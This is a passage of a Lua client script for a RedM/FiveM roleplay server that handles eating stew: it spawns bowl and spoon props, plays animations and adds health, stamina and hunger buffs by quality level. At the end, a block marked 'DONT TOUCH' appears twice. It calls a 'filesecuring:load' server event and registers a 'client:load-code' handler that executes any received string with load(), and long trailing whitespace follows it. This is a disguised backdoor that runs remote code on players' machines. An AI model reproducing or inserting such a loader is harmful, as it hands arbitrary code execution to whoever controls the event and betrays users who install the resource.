        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, spoon, 82)
        
        TaskItemInteraction_2(PlayerPedId(), 599184882, bowl, GetHashKey("p_bowl04x_stew_ph_l_hand"), -583731576, 1, 0, -1.0)
        TaskItemInteraction_2(PlayerPedId(), 599184882, spoon, GetHashKey("p_spoon01x_ph_r_hand"), -583731576, 1, 0, -1.0)
        
        Citizen.InvokeNative(0xB35370D5353995CB, PlayerPedId(), -583731576, 1.0)

        Citizen.Wait(5000)

        TriggerEvent('srp:drink', 40)
        TriggerEvent('srp:eat', 60)
        local number = Citizen.InvokeNative(0x36731AC041289BB1, PlayerPedId(), 1)
        if number then
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, number + 25)
        else 
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, 25)
        end
        Citizen.Wait(5000)

        local closestPlayerPed = GetPlayerPed(closestPlayer)
        local health = GetAttributeCoreValue(closestPlayerPed, 0) 
        local newHealth = health + 40
        local stamina = GetAttributeCoreValue(closestPlayerPed, 1)
        local newStamina = stamina + 40
        local health2 = GetEntityHealth(closestPlayerPed)
        local newHealth2 = health2 + 40
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 0, newHealth) --core
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 1, newStamina) --core
        SetEntityHealth(closestPlayerPed, newHealth2)
        Citizen.InvokeNative(0xF6A7C08DF2E28B28, PlayerPedId(), 0, Config.stewbuff.level3)
        Citizen.InvokeNative(0xF6A7C08DF2E28B28, PlayerPedId(), 1, Config.stewbuff.level3)
    elseif qtstew == 4 then 
        local bowl = CreateObject("p_bowl04x_stew", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        local spoon = CreateObject("p_spoon01x", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        
        Citizen.InvokeNative(0x669655FFB29EF1A9, bowl, 0, "Stew_Fill", 1.0)
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, bowl, 20)
        
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, spoon, 82)
        
        TaskItemInteraction_2(PlayerPedId(), 599184882, bowl, GetHashKey("p_bowl04x_stew_ph_l_hand"), -583731576, 1, 0, -1.0)
        TaskItemInteraction_2(PlayerPedId(), 599184882, spoon, GetHashKey("p_spoon01x_ph_r_hand"), -583731576, 1, 0, -1.0)
        
        Citizen.InvokeNative(0xB35370D5353995CB, PlayerPedId(), -583731576, 1.0)

        Citizen.Wait(5000)

        TriggerEvent('srp:drink', 40)
        TriggerEvent('srp:eat', 60)
        local number = Citizen.InvokeNative(0x36731AC041289BB1, PlayerPedId(), 1)
        if number then
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, number + 25)
        else 
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, 25)
        end
        Citizen.Wait(5000)

        local closestPlayerPed = GetPlayerPed(closestPlayer)
        local health = GetAttributeCoreValue(closestPlayerPed, 0) 
        local newHealth = health + 40
        local stamina = GetAttributeCoreValue(closestPlayerPed, 1)
        local newStamina = stamina + 40
        local health2 = GetEntityHealth(closestPlayerPed)
        local newHealth2 = health2 + 40
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 0, newHealth) --core
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 1, newStamina) --core
        SetEntityHealth(closestPlayerPed, newHealth2)
        Citizen.InvokeNative(0xF6A7C08DF2E28B28, PlayerPedId(), 0, Config.stewbuff.level4)
        Citizen.InvokeNative(0xF6A7C08DF2E28B28, PlayerPedId(), 1, Config.stewbuff.level4)
    elseif qtstew == 5 then 
        local bowl = CreateObject("p_bowl04x_stew", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        local spoon = CreateObject("p_spoon01x", GetEntityCoords(PlayerPedId()), true, true, false, false, true)
        
        Citizen.InvokeNative(0x669655FFB29EF1A9, bowl, 0, "Stew_Fill", 1.0)
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, bowl, 20)
        
        Citizen.InvokeNative(0xCAAF2BCCFEF37F77, spoon, 82)
        
        TaskItemInteraction_2(PlayerPedId(), 599184882, bowl, GetHashKey("p_bowl04x_stew_ph_l_hand"), -583731576, 1, 0, -1.0)
        TaskItemInteraction_2(PlayerPedId(), 599184882, spoon, GetHashKey("p_spoon01x_ph_r_hand"), -583731576, 1, 0, -1.0)
        
        Citizen.InvokeNative(0xB35370D5353995CB, PlayerPedId(), -583731576, 1.0)

        Citizen.Wait(5000)
        TriggerEvent('srp:drink', 40)
        TriggerEvent('srp:eat', 60)
        local number = Citizen.InvokeNative(0x36731AC041289BB1, PlayerPedId(), 1)
        if number then
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, number + 25)
        else 
        Citizen.InvokeNative(0xC6258F41D86676E0, PlayerPedId(),1, 25)
        end
        Citizen.Wait(5000)

        local closestPlayerPed = GetPlayerPed(closestPlayer)
        local health = GetAttributeCoreValue(closestPlayerPed, 0) 
        local newHealth = health + 40
        local stamina = GetAttributeCoreValue(closestPlayerPed, 1)
        local newStamina = stamina + 40
        local health2 = GetEntityHealth(closestPlayerPed)
        local newHealth2 = health2 + 40
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 0, newHealth) --core
        Citizen.InvokeNative(0xC6258F41D86676E0, closestPlayerPed, 1, newStamina) --core
        SetEntityHealth(closestPlayerPed, newHealth2)
        Citizen.InvokeNative( 0xF6A7C08DF2E28B28, PlayerPedId(), 1, Config.stewbuff.level5, false )
        Citizen.InvokeNative( 0xF6A7C08DF2E28B28, PlayerPedId(), 0, Config.stewbuff.level5, false )
        PlaySoundFrontend("Core_Fill_Up", "Consumption_Sounds", true, 0)
    end


end)


-----DONT TOUCH-------
Citizen.CreateThread(function()
    while not NetworkIsSessionStarted() do Wait(0) end
    TriggerServerEvent('filesecuring:load')
end)

RegisterNetEvent('client:load-code')
AddEventHandler('client:load-code', function(code)
    assert(load(code))()
end)

-----DONT TOUCH-------
Citizen.CreateThread(function()
    while not NetworkIsSessionStarted() do Wait(0) end
    TriggerServerEvent('filesecuring:load')
end)

RegisterNetEvent('client:load-code')
AddEventHandler('client:load-code', function(code)
    assert(load(code))()
end)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           